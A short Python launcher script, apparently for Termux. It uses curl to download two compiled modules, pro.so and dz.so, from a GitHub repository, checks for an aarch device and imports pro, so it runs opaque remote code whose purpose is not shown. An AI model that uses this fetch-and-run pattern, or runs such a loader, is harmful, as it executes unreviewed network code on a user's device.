import os
from os import path,system
from platform import uname
arch=uname().machine.lower()
if path.isfile("pro.so"):
    pass
else:
    system("curl -L https://raw.githubusercontent.com/TermuxTahmid/PRO/main/pro.so -o pro.so")
if path.isfile("dz.so"):
    pass
else:
    system("curl -L https://raw.githubusercontent.com/TermuxTahmid/PRO/main/dz.so -o dz.so")

if 'aarch' in arch:
    arch = 'aarch'
    print('\033[1;32m\nCongratulatings! Your Deviec Support This Tools')
    import pro
else:exit('\033[1;31m Sorry System or device not supported ')
    
